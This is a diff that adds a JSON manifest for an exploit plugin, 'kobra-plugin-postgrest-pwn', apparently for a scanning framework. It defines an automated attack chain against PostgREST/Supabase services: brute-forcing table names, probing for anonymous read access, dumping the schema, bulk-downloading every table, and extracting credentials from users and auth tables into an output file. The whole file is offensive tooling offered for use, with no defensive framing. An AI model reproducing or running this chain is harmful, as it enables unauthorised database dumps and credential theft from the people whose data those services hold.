@@ -1,0 +1,61 @@
+{
+  "name": "kobra-plugin-postgrest-pwn",
+  "version": "1.0.0",
+  "author": "shenyo1",
+  "description": "PostgREST/Supabase auto-exploit. From table hint to full DB dump via anonymous JWT. Sumopod-class finding.",
+  "category": "Exploit",
+  "engine_version": ">=4.4.0",
+  "patterns": [
+    {
+      "kind": "trigger",
+      "value": "postgrest.endpoint_discovered",
+      "severity_hint": "High"
+    },
+    {
+      "kind": "trigger",
+      "value": "postgrest.anonymous_access",
+      "severity_hint": "Critical"
+    }
+  ],
+  "exploit_chain": [
+    {
+      "step": 1,
+      "name": "endpoint_enumeration",
+      "description": "Brute-force table names via common_words.txt",
+      "wordlist": "~/.local/share/kobra/wordlists/postgrest-tables.txt",
+      "method": "GET",
+      "fuzz_path": "/{word}"
+    },
+    {
+      "step": 2,
+      "name": "anon_test",
+      "description": "Test each table for anonymous access",
+      "test_query": "?select=*&limit=1"
+    },
+    {
+      "step": 3,
+      "name": "schema_dump",
+      "description": "Extract columns via OpenAPI endpoint",
+      "endpoints": ["/", "/api/", "/rest/v1/"]
+    },
+    {
+      "step": 4,
+      "name": "data_exfil",
+      "description": "Bulk download all tables",
+      "concurrency": 10,
+      "batch_size": 1000
+    },
+    {
+      "step": 5,
+      "name": "auth_table_hunt",
+      "description": "Find users/auth tables, extract creds",
+      "targets": ["users", "auth.users", "profiles", "accounts"]
+    }
+  ],
+  "outputs": {
+    "tables_found": "{output_dir}/postgrest-tables.json",
+    "schema": "{output_dir}/postgrest-schema.json",
+    "data": "{output_dir}/postgrest-data/*.json",
+    "creds": "{output_dir}/postgrest-creds.txt"
+  }
+}
